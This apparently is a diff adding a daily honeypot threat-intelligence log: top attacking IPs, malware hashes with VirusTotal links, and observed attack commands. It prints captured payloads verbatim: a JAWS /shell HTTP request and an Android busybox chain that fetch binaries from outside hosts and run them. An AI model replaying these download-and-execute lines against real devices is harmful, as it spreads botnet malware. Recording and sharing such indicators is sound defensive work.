@@ -1,0 +1,38 @@
+Top 5 IPs for 04-11-2024 :
+
+203.163.247.224
+111.173.89.134
+42.58.252.183
+59.91.166.121
+124.67.68.118
+
+
+
+Malware Observed:
+
+File name : sshd
+0bf15aa87b7edf963533962273cd9c622b74dd1e47e770aa910fdf22ce0851df
+https://www.virustotal.com/gui/file/0bf15aa87b7edf963533962273cd9c622b74dd1e47e770aa910fdf22ce0851df
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+533ecb3dc8598de7a5845d7903ce97cf5695ef854ac121cdcac93295c854ecfc
+https://www.virustotal.com/gui/file/533ecb3dc8598de7a5845d7903ce97cf5695ef854ac121cdcac93295c854ecfc
+
+
+
+Commands/exploits observed :
+
+GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+arm4+arm7;wget+http:/\\/files1.eye-network.ru/wheiuwa4;chmod+777+wheiuwa4;./wheiuwa4+jaws;rm+-rf+wheiuwa4 HTTP/1.1
+Host: HOST-IP
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
+
+cd /data/local/tmp/; rm *; busybox wget http://193.143.1.70/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://193.143.1.70/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://193.143.1.70/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://193.143.1.70/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android
